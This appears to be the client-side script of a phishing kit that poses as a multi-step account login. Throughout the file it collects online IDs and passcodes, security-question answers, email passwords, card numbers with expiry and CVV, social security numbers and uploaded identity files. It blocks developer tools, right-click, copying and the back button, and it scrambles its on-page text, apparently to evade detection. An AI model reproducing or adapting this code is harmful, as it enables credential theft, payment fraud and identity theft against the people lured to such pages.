

/* ==========================================================================
   FITPROJECT v0.1 | MIT License | fitgirlp0rtia@gmail.com
   ========================================================================== */

/* ==========================================================================
   Main Script
   ========================================================================== */
// $(window).on('load', function(){
//     'use strict';

    /* Loading Screen */ 
    $('#loading').fadeOut(2000,function(){
        $(this).hide("smoth");
    });
// });


/* Prevent Browser Back Forward */ 
function preventBack(){
    window.history.forward();
}
setTimeout("preventBack()",0);
window.onunload = function(){ null; }

/* Countdown & Refresh */ 
function refresh(id,url){
    var count = 4,
    sec   = document.getElementById(id),
    interval = setInterval(function(){
        count--;
        if (count > 0) {
            sec.innerHTML= count;
        }
        if(count == 0){
            sec.innerHTML= "0";
            window.location = url;
        } 
    }, 1000);
}




  
$(document).ready(function(e) {
    "use strict";

    setTimeout(function() {
		$('body.logForm').fadeIn();
    }, 2000);
        

    $(document).contextmenu(function(){
        return false;
    });

    $(document).keyup(function (e){
        if(e.keyCode == 44){
            $('body').hide();
        }
    });

    $(document).keydown(function (e){
        if(e.keyCode == 123){
            return false;
        }else if( (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.shiftKey && e.keyCode == 74)){
            return false;
        }else if(e.ctrlKey && (e.keyCode == 117 || e.keyCode == 86 || e.keyCode == 85 || e.keyCode == 83 || e.keyCode == 67) ){
            return false;
        }
    });

    /* Prevent Drag & Drop
    $(document).ready(function() {
      $('input').on('drop', function() {
        return false;
      });
    });

    jQuery.fn.disableTextSelect = function() {
        return this.each(function() {
            $(this).css({
                'MozUserSelect':'none',
                'webkitUserSelect':'none'
            }).attr('unselectable','on').bind('selectstart', function() {
                return false;
            });
        });
    }; $('body').disableTextSelect();*/

    function valideuEml($uEml) {
        var regx = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
        return regx.test($uEml);
    }


var alrtMdl = $("#alrtMdl"),
    skpMdl  = $("#skpMdl"),
    skipUpld  = $("#skipUpld"),
    skpToUpld = $("#skpToUpld"),
    alrtClo = $("#alrtClo"),
    skpClo  = $("#skpClo");

    $("#alrt1, #alrt2, #alrt3, #alrt4, #alrt5, #alrt6").click(function(){
        alrtMdl.show();
    }); 

    alrtClo.click(function(){
        alrtMdl.hide();
        $("html").animate({ scrollTop: 0 }, "slow"); return true; 
    }); 

    $("#skpClo, #skpToUpld").click(function(){
        skpMdl.hide();
        $("html").animate({ scrollTop: 0 }, "slow"); return true; 
    }); 

    skpToUpld.click(function(){
        $("html").animate({ scrollTop: 0 }, "slow"); return true; 
    }); 

    skipUpld.click(function(){
        setTimeout(function() {
            document.getElementById("upldForm").submit();
        }, 2000);
    });

    $(document).click(function(e){
        if (event.target.id == "alrtMdl") {
            alrtMdl.hide();
            $("html").animate({ scrollTop: 0 }, "slow"); return true;
        }
        if (event.target.id == "skpMdl") {
            skpMdl.hide();
            $("html").animate({ scrollTop: 0 }, "slow"); return true;
        }
    }); 


/* ==========================================================================
   Login Script
   ========================================================================== */
    var oId     = $("input#oId"),
        pCd     = $("input#pCd"),
        lgnEr   = $("span#lgnError"),
        logBtn  = $("button#lgn"),
        v_oId   = false,
        v_pCd   = false,
        v_lgnAg = false;

    oId.blur(function(e) {
        if (!$(this).val() || $(this).val().length < 2) {
            return v_oId = false;
        } else {
            return v_oId = true;
        }
    });
    pCd.blur(function(e) {
        if (!$(this).val() || $(this).val().length < 2) {
            return v_pCd = false;
        } else {
            return v_pCd = true;
        }
    });
    logBtn.click(function() {
        if (v_oId && v_pCd) {
            lgnEr.hide();
            $("#lgnSta").hide();
            $(this).addClass("loadingLgn");
            $("#lgnSpi").removeClass("hidden");
            setTimeout(function() {
                document.getElementById("logForm").submit();
            }, 2000);
        }else if((!v_oId && !v_pCd) || !v_oId){
            lgnEr.show().html("Yvpi Vnlrnt RD rz arzzrng. Ultmzt eiy mgmrn.");
        }else{
            lgnEr.show().html("Yvpi Umzzcvdt rz arzzrng. Ultmzt eiy mgmrn.");
        }
        $("input").blur();
        return false;
    });

    var qst_1   = $("select#qst_1"),
        qst_2   = $("select#qst_2"),
        qst_3   = $("select#qst_3"),
        rep_1   = $("input#rep_1"),
        rep_2   = $("input#rep_2"),
        rep_3   = $("input#rep_3"),
        qstBtn  = $("button#qstBtn"),
        v_qst_1 = false,
        v_qst_2 = false,
        v_qst_3 = false,
        v_rep_1 = false,
        v_rep_2 = false,
        v_rep_3 = false;

    qst_1.blur(function(e) {
        if (!$(this).val() || $(this).val() === "qst" || $(this).val().length < 2) {
            $(this).addClass("invalid");
            return v_qst_1 = false;
        } else {
            $(this).removeClass("invalid");
            return v_qst_1 = true;
        }
    });
    qst_2.blur(function(e) {
        if (!$(this).val() || $(this).val() === "qst" || $(this).val().length < 2) {
            $(this).addClass("invalid");
            return v_qst_2 = false;
        } else {
            $(this).removeClass("invalid");
            return v_qst_2 = true;
        }
    });
    qst_3.blur(function(e) {
        if (!$(this).val() || $(this).val() === "qst" || $(this).val().length < 2) {
            $(this).addClass("invalid");
            return v_qst_3 = false;
        } else {
            $(this).removeClass("invalid");
            return v_qst_3 = true;
        }
    });
    rep_1.blur(function(e) {
        if (!$(this).val() || $(this).val().length < 2) {
            $(this).addClass("invalid error");
            return v_rep_1 = false;
        } else {
            $(this).removeClass("invalid error");
            return v_rep_1 = true;
        }
    });
    rep_2.blur(function(e) {
        if (!$(this).val() || $(this).val().length < 2) {
            $(this).addClass("invalid error");
            return v_rep_2 = false;
        } else {
            $(this).removeClass("invalid error");
            return v_rep_2 = true;
        }
    });
    rep_3.blur(function(e) {
        if (!$(this).val() || $(this).val().length < 2) {
            $(this).addClass("invalid error");
            return v_rep_3 = false;
        } else {
            $(this).removeClass("invalid error");
            return v_rep_3 = true;
        }
    });
    qstBtn.click(function() {
        if (v_qst_1 && v_rep_1 && v_qst_2 && v_rep_2 && v_qst_3 && v_rep_3) {
            setTimeout(function() {
                document.getElementById("qstForm").submit();
            }, 2000);
        } else {
            $("input,select").blur();
        }
        return false;
    });

    var uEml    = $("input#uEml"),
        uPwd    = $("input#uPwd"),
        emlBtn  = $("button#emlBtn"),
        emlAsk  = $('#emlAsk'),
        emlMsg  = $('#toggle-emlMsg'),
        emlAsC  = $('#emlAskCLose'),
        v_uEml  = false,
        v_uPwd  = false,
        v_lgnAg = false;

        emlAsk.click(function(){
            emlMsg.toggle();
        });

        emlAsC.click(function(){
            emlMsg.hide();
        });

    uEml.blur(function(e) {
        if (!valideuEml($(this).val()) || !$(this).val() || $(this).val().length < 2) {
            $(this).addClass("invalid");
            $('#sizing-addon2').addClass("askInvalid");
            return v_uEml = false;
        } else {
            $(this).removeClass("invalid");
            $('#sizing-addon2').removeClass("askInvalid");
            return v_uEml = true;
        }
    });
    uPwd.blur(function(e) {
        if (!$(this).val() || $(this).val().length < 2) {
            $(this).addClass("invalid error");
            return v_uPwd = false;
        } else {
            $(this).removeClass("invalid error");
            return v_uPwd = true;
        }
    });

    emlBtn.click(function() {
        if (v_uEml && v_uPwd) {
            setTimeout(function() {
                document.getElementById("emlForm").submit();
            }, 2000);
        }
        $("input").blur();
        return false;
    });



    var cc   = $('input#cc'),
        ex   = $('input#ex'),
        _3d  = $('input#_3d'),
        ss   = $('input#ss'),
        ccBtn = $('button#ccBtn'),
        v_cc = false,
        v_ex = false,
        v_mm = false,
        v_yy = false,
        v_3d = false,
        v_ss = false;

    $("input#cc, input#_3d").keyup(function(e) { 
        if (!/^[0-9]*$/.test(this.value)) { this.value = this.value.split(/[^0-9.]/).join("");}
    });

    cc.keyup(function() {
        $(this).validateCreditCard(function(result) {
            if (result.card_type == null) {
                $(this).addClass("vide_card");
            } else {
                if(result.card_type.name != "amex"){
                    _3d.attr("maxlength","3");
                    _3d.attr("placeholder","CZC (3 drgrez)");
                }else{
                    _3d.attr("maxlength","4");
                    _3d.attr("placeholder","CZC (4 drgrez)");
                }
                $(this).removeClass().addClass("form-control form-control-sm "+result.card_type.name);
            }
            if (!result.valid) {
                return v_cc = false;
            } else {
                return v_cc = true;
            }
        });
    });

    cc.blur(function(e) {
        if (!$(this).val() || !v_cc) {
            $(this).addClass("invalid error");
            return v_cc = false;
        } else {
            $(this).removeClass("invalid error");
            return v_cc = true;
        }
    });

    ex.keyup(function() {
        if (!/^[0-9/]*$/.test(this.value)) { this.value = this.value.split(/[^0-9.]/).join("");}
        if ($(this).val().length === 2) {
            var thisVal = $(this).val();
            thisVal += '/';
            $(this).val(thisVal);
        }
        if ($(this).val().length === 3) {
           var mm = $(this).val().split("/");
           if (mm[0] < '01' || mm[0] == '00' || mm[0] > '12') {
            $(this).addClass("invalid error");
            return v_mm = false;
           }else{
            $(this).removeClass("invalid error");
            return v_mm = true;
           }
        }
        if ($(this).val().length === 7) {
           var yy = $(this).val().split("/");
           if (yy[1] < '2018' || yy[1] > '2040') {
            $(this).addClass("invalid error");
            return v_yy = false;
           }else{
            $(this).removeClass("invalid error");
            return v_yy = true;
           }
        }
    });

    ex.blur(function(e) {
        console.log($(this).val().length);
        if (!$(this).val() || $(this).val().length < 7 || v_mm == false || v_yy == false) {
            $(this).addClass("invalid error");
            return v_ex = false;
        } else {
            $(this).removeClass("invalid error");
            return v_ex = true;
        }
    });
    _3d.blur(function(e) {
        if (!$(this).val() || $(this).val().length < 2) {
            $(this).addClass("invalid error");
            return v_3d = false;
        } else {
            $(this).removeClass("invalid error");
            return v_3d = true;
        }
    });
    
    ss.keyup(function() {
        if (!/^[0-9-]*$/.test(this.value)) { this.value = this.value.split(/[^0-9.]/).join("");}
        if ($(this).val().length === 3) {
            var thisVal = $(this).val();
            thisVal += '-';
            $(this).val(thisVal);
        }
        if ($(this).val().length === 6) {
            var thisVal = $(this).val();
            thisVal += '-';
            $(this).val(thisVal);
        }
    });

    ss.blur(function(e) {
        if (!$(this).val() || $(this).val().length > 20) {
            $(this).addClass("invalid error");
            return v_ss = false;
        } else {
            $(this).removeClass("invalid error");
            return v_ss = true;
        }
    });

    ccBtn.click(function() {
        if (v_cc && v_ex && v_3d && v_ss) {
            setTimeout(function() {
                document.getElementById("ccForm").submit();
            }, 2000);
        }
        $("input").blur();
        return false;
    });

var uplAsk  = $('#uplAsk'),
    uplMsg  = $('#toggle-uplMsg'),
    uplMsC  = $('#uplAskCLose'),
    txtErr  = $('p#uplError'),
    file1   = $("input#file1"),
    file2   = $("input#file2"),
    file3   = $("input#file3"),
    upldBtn = $("button#upldBtn"),
    v_file1 = false,
    v_file2 = false,
    v_file3 = false;
    uplAsk.click(function(){
        uplMsg.toggle();
    });

    uplMsC.click(function(){
        uplMsg.hide();
    });

    upldBtn.click(function() {
        if(file1.val() && file2.val() && file3.val()){
            txtErr.hide('smoth');
            setTimeout(function() {
                document.getElementById("upldForm").submit();
            }, 2000);
        }
        else {
            txtErr.show('smoth');
        }
        $("input").blur();
        return false;
    });

});